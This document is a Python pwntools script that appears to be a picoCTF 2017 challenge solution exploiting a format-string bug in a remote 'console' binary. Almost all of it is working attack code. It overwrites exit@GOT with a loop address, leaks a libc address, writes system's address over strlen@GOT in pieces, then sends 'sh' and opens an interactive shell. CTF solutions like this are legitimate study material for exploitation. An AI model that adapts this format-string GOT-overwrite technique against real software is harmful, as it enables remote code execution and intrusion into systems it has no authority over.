#!/usr/bin/env python

from pwn import *


# first, overwrite exit() with loop(), so that we can keep runing
# second, allow strlen<plt> to materialize (0x00sec)
# next, overwrite strlen() with system
# finally, set prompt to /bin/sh and get shell!


# objdump -R 
EXIT_GOT 	= 0x601258
EXIT_PLT 	= 0x400730
STRLEN_GOT 	= 0x601210
LOOP 		= 0x4009bd

#socks proxy
#context.proxy = 'localhost'
env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
#r = process(["./console", "console_log"], raw=False, env=env)
"""gdb.attach(r, '''
	set disable-randomization off
	break  set_login_message
	c
	''')
	"""
r = remote("shell2017.picoctf.com", 11496)


def leak():
	arr = set("%p "*15).split(" ")
	return (arr[0], arr[6]);

def set(message):
	r.sendline("e ".ljust(8) + message)
	r.recvuntil("set!")
	return r.recv().lstrip()


#overwrite exit@plt with loop()
payload = ("|%2484x%17$hn|").rjust(16) # leak, 8 byteoffset to next val.
#another 8 byte offset to ensure that
#our input is in its own place on the stack?
payload += p64(EXIT_GOT)
log.info("Overwriting exit@GOT to point back to loop...")
set(payload)

log.info("Leaking libc and stack...")
leaks = leak()

#exit() overwritten!
log.info("libc leak: {0}".format(leaks[0]))
# log.info("stack leak: {0}".format(leaks[1]))

STRLEN_LEAK = 0x7f89611cfc10 
SYSTEM_LEAK = 0x7f896118f490 # this is taken from just printing in GDB once
SAMPLE_LEAK = 0x7f89614f4323

# we're given sample leaks and want to write to strlen
STRLEN_OFFSET = SAMPLE_LEAK - STRLEN_LEAK
SYSTEM_OFFSET = SAMPLE_LEAK - SYSTEM_LEAK

STRLEN = int(leaks[0], 16) - STRLEN_OFFSET
SYSTEM = int(leaks[0], 16) - SYSTEM_OFFSET
log.info("Strlen shoudl be at: 0x{0:x}".format(STRLEN))
log.info("System should be at: 0x{0:x}".format(SYSTEM))
#log.info("Check with GDB now...")
#r.sendline("l q")
log.info("Populating strlen@GOT...")
r.sendline("p q")


# write lower 4
SYSTEM_LOWER = (SYSTEM & 0xffff) - 8
log.info("SYSTEM_LOWER: {0:x}".format(SYSTEM_LOWER))
payload = ("|%%%dx|%%17$hn|" % SYSTEM_LOWER).rjust(16)
payload += p64(STRLEN_GOT)
log.info("Overwriting bottom bytes of strlen...")
set(payload)

#write middle 4
SYSTEM_MIDDLE = ((SYSTEM & 0xffff0000) >> 16) - 8
log.info("SYSTEM_MIDDLE: {0:x}".format(SYSTEM_MIDDLE))
payload = ("|%%%dx%%17$hn|" % SYSTEM_MIDDLE).rjust(16)
payload += p64(STRLEN_GOT+2)
log.info("Overwriting middle bytes of strlen...")
set(payload)

#stuff gets buffered :(

log.info("Calling system...")
r.sendline("p sh")
pause()
r.interactive()